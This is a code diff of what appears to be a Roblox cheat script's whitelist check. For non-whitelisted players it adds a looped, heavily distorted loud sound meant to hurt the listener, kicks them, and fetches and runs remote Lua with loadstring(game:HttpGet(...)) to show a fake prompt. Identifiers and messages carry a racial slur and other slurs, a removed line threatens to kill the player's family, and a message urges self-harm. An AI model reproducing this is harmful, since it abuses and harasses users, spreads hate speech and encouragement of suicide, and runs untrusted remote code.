@@ -9,7 +9,26 @@ print "big cock and balls"
 else
 
 if plr:IsInGroup(groupID) == false then
-game.Players.LocalPlayer:Kick("u fucking idiot u better dont cuz im about to kill ur whole family")
+local ear_rape = Instance.new("Sound",workspace)
+ear_rape.Name = "get fucked retard LMFAO"
+ear_rape.SoundId = "http://www.roblox.com/asset/?id=3237445619"
+ear_rape.Looped = true
+ear_rape.Volume = 10
+ear_rape:Play() 
+local niggerfuckery = Instance.new("DistortionSoundEffect",ear_rape)
+niggerfuckery.Enabled = true
+niggerfuckery.Level = 100000001
+niggerfuckery.Priority = 55
+
+game.Players.LocalPlayer:Kick("")
+game:GetService("GuiService"):ClearError()
+
+
+local prompt = loadstring(game:HttpGet('https://www.floppa.dev/FakePrompt.lua', true))()
+prompt.createPrompt("retard", "ur not whitelisted lmfao, kill your fucking self and hang ur balls in a rooftop", "im gay", true, function()
+    game.Players.LocalPlayer:Kick("bestgore.com")      
+        print "leave bozo"
+end) 
     end
 end
 
